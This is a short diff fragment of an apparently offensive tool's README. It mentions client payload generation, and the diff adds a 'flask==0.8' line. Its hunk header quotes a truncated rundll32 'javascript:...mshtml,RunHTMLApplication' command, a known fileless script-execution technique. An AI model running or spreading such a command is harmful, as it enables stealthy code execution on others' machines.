@@ -57,6 +57,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%
 客户端payload生成 payload.py
 
 数据库操作相关 /models/
+flask==0.8
 
 ##联系方式
 http://5alt.me
